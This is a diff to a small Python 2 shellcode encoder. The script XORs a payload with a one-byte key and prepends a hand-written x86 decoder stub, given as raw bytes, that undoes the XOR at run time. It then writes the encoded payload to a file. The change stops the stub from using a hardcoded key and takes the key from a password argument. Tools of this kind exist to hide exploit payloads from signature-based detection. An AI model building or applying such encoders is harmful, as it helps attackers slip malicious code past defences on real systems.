@@ -10,12 +10,9 @@ def encrypt(shellcode, password):
         result += chr(ord(i) ^ password)
     return result
 
-def build(shellcode):
+def build(shellcode, password):
     length = len(shellcode)
-    print length
-    result = "\xeb\x10\x5e\x31\xc9\xb1" + (chr(length)) + "\x8a\x06\x34\xe9\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff"
-    print binascii.b2a_hex(result)
-    print binascii.b2a_hex(shellcode)
+    result = "\xeb\x10\x5e\x31\xc9\xb1" + (chr(length)) + "\x8a\x06\x34" + chr(password) + "\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff"
     result += shellcode
     return result
 
@@ -42,7 +39,7 @@ def main():
     print "[SHELLCODE] : " + binascii.b2a_hex(shellcode)
     print "[PASSWORD] : " + str(password)
     encrypted_shellcode = encrypt(shellcode, password)
-    result = build(encrypted_shellcode)
+    result = build(encrypted_shellcode, password)
     print "[ENCRYPTED] : " + binascii.b2a_hex(result)
     result_file = open("encrypted_" + filename, "w")
     result_file.write(result)
